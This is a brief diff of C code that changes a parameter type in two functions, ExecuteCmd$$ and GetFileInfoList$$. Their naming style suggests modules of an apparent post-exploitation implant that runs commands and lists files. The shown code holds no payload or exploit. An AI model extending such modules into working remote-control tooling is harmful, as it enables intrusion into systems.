@@ -1,7 +1,7 @@
 ﻿#include "FuncDecl.h"
 
 // 执行 CMD 命令
-void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* specialParaList) {
+void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(130);
     MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[-] CMD Failed.");
     *pOutputDataLength = 15;
@@ -44,7 +44,7 @@ void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData
 }
 
 // 获取文件信息列表
-void GetFileInfoList$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID* specialParaList) {
+void GetFileInfoList$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(330);
     MSVCRT$sprintf_s(*pOutputData, 330, "%s", "[-] GetFileInfoList Failed.");
     *pOutputDataLength = 27;
